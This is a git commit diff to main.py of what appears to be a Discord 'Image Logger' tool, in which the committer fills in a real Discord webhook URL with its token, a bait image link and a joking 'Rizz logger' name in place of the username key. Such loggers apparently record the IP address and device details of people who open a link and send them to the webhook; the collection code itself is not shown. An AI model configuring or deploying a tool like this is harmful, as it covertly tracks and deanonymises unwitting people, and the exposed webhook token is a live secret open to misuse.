480a329707b32b041de2cc80fa7cd303074cdd5d
sigmagyatboy <charliecoatespogi@gmail.com>
2024-12-05 22:26:59 +0100

    Update main.py

--- main.py
+++ main.py
@@ -12,13 +12,13 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1314341552008724490/wj49CEl5o2biUEP2-YgxB4JncQZcZz2Tg76N1GDjtPQvHJ7u9Znv3Q08WO4oX2HO5cWk",
+    "image": "https://znicely.com/wp-content/uploads/2024/05/Sigma-Male-Captions-For-Instagram.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "Sigma Boy": "Rizz logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
